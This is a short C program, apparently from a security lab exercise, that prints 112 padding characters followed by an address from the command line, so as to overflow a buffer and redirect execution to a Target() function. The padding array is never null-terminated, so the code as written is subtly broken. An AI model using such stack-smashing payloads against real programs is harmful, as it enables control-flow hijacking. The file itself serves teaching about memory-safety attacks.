#include <stdio.h>
#include <stdlib.h>


int main (int argc, char *argv[])
{
	
	int i=0;
	char attackString[112]; 
	//Initialize the string with characters equal to the size of Buffer + NOP.
	for(i=0;i<112;i++)
	{
		attackString[i] = 'a'; 
	}
	printf("%s",attackString);
	//Add the address of Target() to get it in the stack.
	printf("%s",argv[1]);
	return 0;
}

